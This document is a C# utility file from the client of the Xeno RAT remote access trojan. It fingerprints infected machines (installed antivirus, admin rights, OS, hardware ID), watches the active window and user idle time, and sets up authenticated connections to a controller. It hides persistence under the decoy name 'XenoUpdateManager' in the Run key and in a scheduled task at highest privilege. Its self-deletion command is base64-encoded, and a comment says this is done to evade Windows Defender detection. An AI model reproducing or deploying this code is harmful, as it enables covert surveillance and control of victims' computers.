using Microsoft.Win32;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace xeno_rat_client
{
    public class Utils
    {

        /// <summary>
        /// Determines whether the current user is a member of the administrator group.
        /// </summary>
        /// <returns>True if the current user is a member of the administrator group; otherwise, false.</returns>
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();

        /// <summary>
        /// Retrieves a handle to the foreground window (the window with which the user is currently working).
        /// </summary>
        /// <returns>
        /// The handle to the foreground window.
        /// </returns>
        /// <remarks>
        /// This method retrieves a handle to the foreground window, which is the window that the user is currently interacting with.
        /// The handle can be used to perform various operations on the window, such as sending messages or modifying its properties.
        /// </remarks>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        /// <summary>
        /// Retrieves the text of the specified window's title bar, if it has one.
        /// </summary>
        /// <param name="hWnd">A handle to the window or control containing the text.</param>
        /// <param name="text">The buffer that will receive the text.</param>
        /// <param name="count">The maximum number of characters to copy to the buffer, including the null-terminating character.</param>
        /// <returns>
        /// If the function succeeds, the return value is the length, in characters, of the copied string, not including the terminating null character.
        /// If the window has no title bar or text, if the title bar is empty, or if the window or control handle is invalid, the return value is zero.
        /// To get extended error information, call GetLastError.
        /// </returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// Retrieves the length, in characters, of the specified window's title bar text (if it has one). If the specified window is a control, the function retrieves the length of the text within the control.
        /// </summary>
        /// <param name="hWnd">A handle to the window or control.</param>
        /// <returns>The length of the window's title bar text, in characters.</returns>
        /// <exception cref="Win32Exception">Thrown when an error occurs while retrieving the window's title bar text length.</exception>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        /// <summary>
        /// Retrieves the identifier of the thread that created the specified window and, optionally, the identifier of the process that created the window.
        /// </summary>
        /// <param name="hWnd">A handle to the window.</param>
        /// <param name="ProcessId">When this method returns, contains the identifier of the process that created the window.</param>
        /// <returns>If the function succeeds, the return value is the identifier of the thread that created the window. If the function fails, the return value is zero.</returns>
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        /// <summary>
        /// Retrieves the time of the last input event.
        /// </summary>
        /// <param name="plii">A reference to a LASTINPUTINFO structure that receives the time of the last input event.</param>
        /// <returns>True if the function succeeds; otherwise, false.</returns>
        /// <remarks>
        /// This method retrieves the time (in milliseconds) of the last input event. The input events include keyboard and mouse input.
        /// </remarks>
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        /// <summary>
        /// Closes an open object handle.
        /// </summary>
        /// <param name="hObject">A handle to an open object.</param>
        /// <returns>True if the function succeeds, false if it fails.</returns>
        /// <remarks>
        /// This method closes an open object handle. If the function succeeds, the return value is true. If the function fails, the return value is false.
        /// </remarks>
        [DllImport("user32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        /// <summary>
        /// Retrieves the caption of the active window asynchronously.
        /// </summary>
        /// <returns>A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result contains the caption of the active window.</returns>
        /// <remarks>
        /// This method asynchronously retrieves the caption of the active window by executing the <see cref="GetCaptionOfActiveWindow"/> method within a separate task.
        /// </remarks>
        public static async Task<string> GetCaptionOfActiveWindowAsync() 
        {
            return await Task.Run(() => GetCaptionOfActiveWindow());
        }

        /// <summary>
        /// Retrieves the caption of the active window.
        /// </summary>
        /// <returns>The caption of the active window.</returns>
        /// <remarks>
        /// This method retrieves the caption of the active window by obtaining the handle of the foreground window and using it to get the window text.
        /// It then retrieves the process ID associated with the window handle and uses it to get the process information, which is used to construct the caption.
        /// If the window title is empty, only the process name is used as the caption; otherwise, the process name is appended with the window title.
        /// </remarks>
        public static string GetCaptionOfActiveWindow()
        {
            string strTitle = string.Empty;
            IntPtr handle = GetForegroundWindow();
            int intLength = GetWindowTextLength(handle) + 1;
            StringBuilder stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }
            try
            {
                uint pid;
                GetWindowThreadProcessId(handle, out pid);
                Process proc=Process.GetProcessById((int)pid);
                if (strTitle == "")
                {
                    strTitle = proc.ProcessName;
                }
                else 
                {
                    strTitle = proc.ProcessName + " - " + strTitle;
                }
                proc.Dispose();
            }
            catch 
            { 
                
            }
            return strTitle;
        }

        /// <summary>
        /// Checks if the current user is an admin and returns a boolean value indicating the result.
        /// </summary>
        /// <returns>True if the current user is an admin; otherwise, false.</returns>
        /// <remarks>
        /// This method internally calls the IsUserAnAdmin method to determine if the current user has admin privileges.
        /// If an exception occurs during the check, the method returns false.
        /// </remarks>
        public static bool IsAdmin()
        {
            bool admin = false;
            try
            {
                admin = IsUserAnAdmin();
            }
            catch { }
            return admin;
        }

        /// <summary>
        /// Retrieves the installed antivirus products on the local machine and returns a comma-separated list of the product names.
        /// </summary>
        /// <returns>
        /// A comma-separated string containing the names of the installed antivirus products. If no antivirus products are found, "N/A" is returned.
        /// </returns>
        /// <exception cref="System.Exception">
        /// An exception may be thrown if there is an issue retrieving the antivirus products.
        /// </exception>
        public static string GetAntivirus()
        {
            List<string> antivirus = new List<string>();
            try
            {
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        string anti = Instance.GetPropertyValue("displayName").ToString();
                        if (!antivirus.Contains(anti)) 
                        {
                            antivirus.Add(anti);
                        }
                        Instance.Dispose();
                    }
                    if (antivirus.Count == 0) 
                    {
                        antivirus.Add("N/A");
                    }   
                }
                return string.Join(", ", antivirus);
            }
            catch
            {
                if (antivirus.Count == 0)
                {
                    antivirus.Add("N/A");
                }
                return string.Join(", ", antivirus);
            }
        }

        /// <summary>
        /// Retrieves the Windows version and architecture information.
        /// </summary>
        /// <returns>The Windows version and architecture in the format "Caption - OSArchitecture".</returns>
        /// <remarks>
        /// This method retrieves the Windows version and architecture information using WMI (Windows Management Instrumentation).
        /// It queries the Win32_OperatingSystem class to obtain the necessary information.
        /// The method returns a string containing the Windows version and architecture details.
        /// </remarks>
        public static string GetWindowsVersion()
        {
            string r = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                ManagementObjectCollection information = searcher.Get();
                if (information != null)
                {
                    foreach (ManagementObject obj in information)
                    {
                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
                    }
                    information.Dispose();
                }
            }
            return r;
        }

        /// <summary>
        /// Generates a unique hardware identifier (HWID) based on various system parameters.
        /// </summary>
        /// <returns>
        /// A string representing the unique hardware identifier (HWID) generated based on the processor count, user name, machine name, operating system version, and total size of the system drive.
        /// If an exception occurs during the generation process, the method returns "UNKNOWN".
        /// </returns>
        /// <remarks>
        /// This method combines various system parameters such as processor count, user name, machine name, operating system version, and total size of the system drive to create a unique hardware identifier (HWID).
        /// The method uses a hashing function to generate the HWID and returns it as a string.
        /// If any exception occurs during the generation process, the method returns "UNKNOWN" to indicate that the HWID could not be generated accurately.
        /// </remarks>
        public static string HWID()
        {
            try
            {
                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion,new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
            }
            catch
            {
                return "UNKNOWN";
            }
        }

        /// <summary>
        /// Computes the MD5 hash of the input string and returns the first 20 characters in uppercase.
        /// </summary>
        /// <param name="strToHash">The input string to be hashed.</param>
        /// <returns>The MD5 hash of the input string, truncated to 20 characters and converted to uppercase.</returns>
        /// <remarks>
        /// This method computes the MD5 hash of the input string using the MD5CryptoServiceProvider class.
        /// It then converts the hash bytes to a hexadecimal string and truncates it to 20 characters.
        /// The resulting hash is returned in uppercase.
        /// </remarks>
        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }

        /// <summary>
        /// Connects to a socket, sets up a node, and authenticates it asynchronously.
        /// </summary>
        /// <param name="sock">The socket to connect to.</param>
        /// <param name="key">The byte array key for authentication.</param>
        /// <param name="type">The type of authentication (default is 0).</param>
        /// <param name="ID">The ID for authentication (default is 0).</param>
        /// <param name="OnDisconnect">An action to be performed on disconnection (default is null).</param>
        /// <returns>An authenticated node if successful; otherwise, null.</returns>
        /// <remarks>
        /// This method connects to the specified socket, creates a new node with the provided socket handler and disconnection action.
        /// It then attempts to authenticate the node asynchronously with the specified type and ID.
        /// If the authentication is successful, the authenticated node is returned; otherwise, null is returned.
        /// </remarks>
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(type, ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }

        /// <summary>
        /// Removes any startup entries related to the specified executable path.
        /// </summary>
        /// <param name="executablePath">The path of the executable for which startup entries need to be removed.</param>
        /// <exception cref="System.Security.SecurityException">The caller does not have the required permission.</exception>
        /// <exception cref="System.InvalidOperationException">The schtasks.exe process is already running.</exception>
        /// <exception cref="System.ComponentModel.Win32Exception">An error occurred when accessing the native Windows API.</exception>
        /// <remarks>
        /// This method removes any startup entries related to the specified executable path from the system's startup configurations.
        /// It first checks for scheduled tasks using schtasks.exe and deletes any task that runs the specified executable.
        /// Then, it checks the registry for any startup entries and removes them if they match the specified executable path.
        /// </remarks>
        public async static Task RemoveStartup(string executablePath) 
        {
            await Task.Run(() =>
            {
                if (Utils.IsAdmin())
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "schtasks.exe";
                        process.StartInfo.Arguments = $"/query /v /fo csv";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        try { process.WaitForExit(); } catch { }
                        process.Dispose();
                        string[] csv_data = output.Split('\n');
                        if (csv_data.Length > 1)
                        {
                            List<string> keys = csv_data[0].Replace("\"", "").Split(',').ToList();
                            int nameKey = keys.IndexOf("TaskName");
                            int actionKey = keys.IndexOf("Task To Run");
                            foreach (string csv in csv_data)
                            {
                                string[] items = csv.Split(new string[] { "\",\"" }, StringSplitOptions.None);
                                if (keys.Count != items.Length)
                                {
                                    continue;
                                }
                                if (nameKey == -1 || actionKey == -1)
                                {
                                    continue;
                                }

                                if (items[actionKey].Replace("\"", "").Trim() == executablePath)
                                {
                                    try
                                    {
                                        Process proc = new Process();
                                        proc.StartInfo.FileName = "schtasks.exe";
                                        proc.StartInfo.Arguments = $"/delete /tn \"{items[nameKey]}\" /f";
                                        proc.StartInfo.UseShellExecute = false;
                                        proc.StartInfo.RedirectStandardOutput = true;
                                        proc.StartInfo.CreateNoWindow = true;

                                        proc.Start();
                                        try { proc.WaitForExit(); } catch { }
                                        process.Dispose();
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                    catch { }
                }
                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                try
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                    {
                        foreach (string i in key.GetValueNames())
                        {
                            if (key.GetValue(i).ToString().Replace("\"", "").Trim() == executablePath)
                            {
                                key.DeleteValue(i);
                            }
                        }
                    }
                }
                catch
                {
                }
            });

            
        }

        /// <summary>
        /// Uninstalls the application by removing it from startup, executing a command to delete the application file, and then terminating the current process.
        /// </summary>
        /// <remarks>
        /// This method removes the application from the startup, deletes the application file using a command executed in a hidden command prompt window, and then terminates the current process.
        /// </remarks>
        public async static Task Uninstall() 
        {
            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
            await RemoveStartup(Assembly.GetEntryAssembly().Location);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + Assembly.GetEntryAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Process.GetCurrentProcess().Kill();
        }

        /// <summary>
        /// Adds the specified executable to the current user's startup registry without requiring admin privileges.
        /// </summary>
        /// <param name="executablePath">The full path to the executable file to be added to the startup.</param>
        /// <param name="name">The name under which the executable will be added to the startup (default is "XenoUpdateManager").</param>
        /// <returns>A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result is <see langword="true"/> if the operation was successful; otherwise, <see langword="false"/>.</returns>
        /// <exception cref="System.Security.SecurityException">Thrown when the user does not have permission to access the registry key.</exception>
        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
        {
            return await Task.Run(() =>
                   {
                        string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                        try
                        {
                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                            {
                                key.SetValue(name, "\"" + executablePath + "\"");
                            }
                            return true;
                        }
                        catch
                        {
                            return false;
                        }
                   });
        }

        /// <summary>
        /// Adds the specified executable to the Windows startup for all users and returns a boolean indicating whether the operation was successful.
        /// </summary>
        /// <param name="executablePath">The full path to the executable file to be added to the startup.</param>
        /// <param name="name">The name of the task to be created in the Windows Task Scheduler. Default is "XenoUpdateManager".</param>
        /// <returns>A <see cref="System.Boolean"/> value indicating whether the operation was successful. Returns <c>true</c> if the task was created successfully; otherwise, <c>false</c>.</returns>
        /// <exception cref="System.Exception">Thrown if an error occurs while attempting to add the task to the Windows Task Scheduler.</exception>
        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
        {
            try
            {
                string xmlContent = $@"
                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
                  <Triggers>
                    <LogonTrigger>
                      <Enabled>true</Enabled>
                    </LogonTrigger>
                  </Triggers>
                  <Principals>
                    <Principal id='Author'>
                      <LogonType>InteractiveToken</LogonType>
                      <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                  </Principals>
                  <Settings>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                  </Settings>
                  <Actions>
                    <Exec>
                      <Command>{executablePath}</Command>
                    </Exec>
                  </Actions>
                </Task>";

                string tempXmlFile = Path.GetTempFileName();
                File.WriteAllText(tempXmlFile, xmlContent);

                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = $"/Create /TN \"{name}\" /XML \"{tempXmlFile}\" /F";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                await Task.Delay(3000);
                string output = process.StandardOutput.ReadToEnd();

                File.Delete(tempXmlFile);

                if (output.Contains("SUCCESS"))
                {
                    return true;
                }
            }
            catch
            {
                
            }

            return false; 
        }

        /// <summary>
        /// Asynchronously retrieves the system's idle time in milliseconds.
        /// </summary>
        /// <returns>The system's idle time in milliseconds.</returns>
        /// <remarks>
        /// This method asynchronously retrieves the system's idle time by running the <see cref="GetIdleTime"/> method in a separate task.
        /// </remarks>
        public static async Task<uint> GetIdleTimeAsync() 
        {
            return await Task.Run(() => GetIdleTime());
        }

        /// <summary>
        /// Retrieves the number of milliseconds that have elapsed since the last input event (keyboard or mouse) was received.
        /// </summary>
        /// <returns>The number of milliseconds that have elapsed since the last input event was received.</returns>
        /// <remarks>
        /// This method retrieves the idle time by using the GetLastInputInfo function to obtain the time of the last input event and then calculates the difference between the current time and the last input time to determine the idle time.
        /// </remarks>
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);
            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }

    }
}
